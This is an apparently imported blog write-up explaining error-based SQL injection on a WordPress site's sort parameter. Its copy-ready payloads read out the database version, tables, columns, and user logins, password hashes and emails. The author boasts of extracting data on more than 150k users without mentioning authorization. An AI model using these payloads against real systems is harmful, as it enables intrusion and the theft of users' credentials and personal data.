---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-10-27_error-based-sql-injection-on-a-wordpress-website-and-extract-more-than-150k-user.md
original_filename: 2020-10-27_error-based-sql-injection-on-a-wordpress-website-and-extract-more-than-150k-user.md
title: Error-Based SQL Injection on a WordPress website and extract more than 150k
  user details
category: documents
detected_topics:
- sqli
- command-injection
tags:
- imported
- documents
- sqli
- command-injection
language: en
raw_sha256: c0887038387b05116f169aa6b4e80ad4d808d7e029fb2d191188a43d526a5037
text_sha256: 0b75fed467c4067b57d39685b1f3ddb3eee9c4d3d7f6d63933c7aae41fad95d6
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Error-Based SQL Injection on a WordPress website and extract more than 150k user details

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-10-27_error-based-sql-injection-on-a-wordpress-website-and-extract-more-than-150k-user.md
- Source Type: markdown
- Detected Topics: sqli, command-injection
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `c0887038387b05116f169aa6b4e80ad4d808d7e029fb2d191188a43d526a5037`
- Text SHA256: `0b75fed467c4067b57d39685b1f3ddb3eee9c4d3d7f6d63933c7aae41fad95d6`


## Content

---
title: "Error-Based SQL Injection on a WordPress website and extract more than 150k user details"
url: "https://ynoof.medium.com/error-based-sql-injection-on-a-wordpress-website-and-extract-more-than-150k-user-details-f65f987c2cc0"
authors: ["Ynoof Alassiri"]
bugs: ["SQL injection"]
publication_date: "2020-10-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4175
scraped_via: "browseros"
---

# Error-Based SQL Injection on a WordPress website and extract more than 150k user details

Error-Based SQL Injection on a WordPress website and extract more than 150k user details
Ynoof Alassiri
Follow
6 min read
·
Oct 27, 2020

284

2

Description

First of all, this is my first write-up, so sorry for any mistakes. In this write-up, I will share with you how I get the data of more than 150k users from a WordPress website, and how I bypassed some of the errors that happen to me in this WordPress website.

Detect the vulnerability and fix the errors

Let’s called the website target.com

I see this page and as we know to detect SQL injection vulnerabilities we will use single-quote ‘, double-quote “, slash /, or hash # …etc

so I found this URL :

https://target.com/pages/?sort=1

and I tried to detect the SQL error with the single-quote [‘]

https://target.com/pages/?sort=1'

but no error, nothing shown on the page ???

some people will leave the website and some other smart like me 😂 will go to open the page source [This happened to me more than one time so always try to check everything], so I go to the page source, and I found the following Error:

<div id="error"><p class="wpdberror"><strong>WordPress database error:</strong> [You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#039;\\\\\\&#039; ASC LIMIT 10 OFFSET 4120&#039; at line 6]<br /><code>
  SELECT
  p.*,
  c.Name as CategoryName,
  c.Slug as CategorySlug,
  c.Code as CategoryCode,
  (CAST(p.UpvoteCount as SIGNED) - CAST(p.DownvoteCount as SIGNED)) as Votes FROM wp_news_posts AS p LEFT JOIN wp_news_categories c ON(c.Id = p.CategoryId) WHERE p.AggregatorId = 3 AND p.Status != &quot;rejected&quot; AND p.Status != &quot;pending&quot; GROUP BY p.Id ORDER BY p.1\\\\\\&#039; ASC LIMIT 10 OFFSET 4120</code></p></div><!DOCTYPE html>

As I know if the injection after limit you can’t execute SQL Injection in this case, but in my case, the injection point is before the LIMIT so it is possible to execute SQL Injection

The first thing we will try to fix this error, I tried the following :

https://target.com/pages/?sort=1'--
https://target.com/pages/?sort=1'-- -
https://target.com/pages/?sort=1'/
https://target.com/pages/?sort=1'#

but no luck, I always got the following error:

WordPress database error: [Unknown column &#039;p.1&#039; in &#039;order clause&#039;]
  SELECT
  p.*,
  c.Name as CategoryName,
  c.Slug as CategorySlug,
  c.Code as CategoryCode,
  (CAST(p.UpvoteCount as SIGNED) - CAST(p.DownvoteCount as SIGNED)) as Votes FROM wp_news_posts AS p LEFT JOIN wp_news_categories c ON(c.Id = p.CategoryId) WHERE p.AggregatorId = 3 AND p.Status != &quot;rejected&quot; AND p.Status != &quot;pending&quot; GROUP BY p.Id ORDER BY p.1 ASC LIMIT 10 OFFSET 4120

this is the error [Unknown column p.1 in order clause]

the most beautiful thing in this error is shown some of the columns in the database, so we can fix this error by replacing the value of the parameter sort with any column related to [p], the error is shown 6 columns which are : UpvoteCount , DownvoteCount , CategoryId , AggregatorId , Status and Id , chose one of them :

https://target.com/pages/?sort=CategoryId

no error is shown on the source-page, so I successfully fix the error [Unknown column p.1 in order clause] by replacing the value of the sort parameter with CategoryId which is a column in the database.

How does Error-Based work

A method of extracting information from a database when UNION SELECT function does not work at all. This can be done using a compiled query to extract the database information

How do you know you should use

You can use Error-Based query in the following errors you get :

a. The Used Select Statements Have  Different Number Of Columns.
b. Unknown Column 1 or no columns at all (in webpage and page source)
c._error_ #1604
Knowing the Database Version

Enter this query at the end of the URL:

and (SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y)

In my case this will look like this :

<https://target.com/pages/?sort=CategoryId> and (SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y)

The version of the database is :

10.3.14-MariaDB
Getting the database name

we can get the database name with this query:

and (SELECT 0 FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y)

increase the limit function to extract all the databases.

Example: limit 0,1 or limit 1,1 or limit 2,1 …etc

In my case this will look like this:

<https://target.com/pages/?sort=CategoryId> and (SELECT 0 FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y)

The database name is:

prd2
Getting the table names

We can get the table names with this query:

and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

and this is in my case :

<https://target.com/pages/?sort=CategoryId> and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

the first table name is :

[Duplicate entry &#039;wp_mail~1; for key group_key]

First table wp_mail

Get Ynoof Alassiri’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

as I mentioned above increase the limit function to get all the tables in the database, and yes I get more than 180 tables 😈

or you can get all the tables without using the limit function, just use the following query:

CategoryId+and (select 1 from (select count(*),concat((select(select substring(group_concat(table_name),1,150)) from information_schema.tables where table_schema=database()),floor(rand(0)*2))x from information_schema.tables group by x)a)

you need to increment the 1,150 to Ex. 20,150, 40,150 … etc

if thesubstring function didn't work, you can use substr or mid

One of the important tables is wp_users

so, let's get the columns of wp_users table.

Getting columns from wp_users table

we can get the columns with this query :

and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x77705f7573657273 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

0x77705f7573657273 : wp_users in HEX.

and in my case:

<https://target.com/pages/?sort=CategoryId> and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x77705f7573657273 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

Increment the limit to extract all columns…

or you can extract all columns without limit function as I mentioned above with substring, substr , or mid

Column names :

ID
user_login
user_pass
user_nicename
user_email
user_url
user_registered
user_activation_key
user_status
display_name
Extracting the data from columns

we can extract the data from columns with the following query:

<https://target.com/pages/?sort=CategoryId> and (select 1 from (select count(*),concat((select(select concat(cast(concat(ID,0x7e,user_login,0x7e,user_pass,0x7e,user_email) as char),0x7e)) from prd2.wp_users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

or without limit function with the following query:

CategoryId+And(select 1 from(select count(*),concat(0x3a,(select substr(group_concat(ID,0x7e,user_login,0x7e,user_pass,0x7e,user_email),1,150)from prd2.wp_users),0x3a,floor(rand(0)*2))x from information_schema.tables group by x)z)

0x7e : ~ in HEX you can separate between them by using whatever you want.

prd2.wp_users: prd2 the database in my case which we extracted in the above with knowing the database name query, and wp_users the table we want to extract the data from it.

Let's do something faster and extract the data with Burp Intruder.

Intercept the request that contains the query of the data extractor with a burp suite.
send the request to Intruder.
Press enter or click to view image in full size
We will use grep to extract the data we want, follow these steps:
Go to option
Go to Grep — Extract, then click add
Click on the Refetch response button.
Select the data that you want to fetch
Click OK
Press enter or click to view image in full size
We want to save the only data that we selected in the grep -extract step, after the attacks follow these steps
Press enter or click to view image in full size

Here is the end of the story, and I can extract the data of more than 150k users, with a lot of valuable details, its an eCommerce website and you know what I mean.

what you learn from this simple write-up:

always try to view the page source
understand the error very well and don’t depend on the SQLMAP or any other tool for the first time.

Thanks
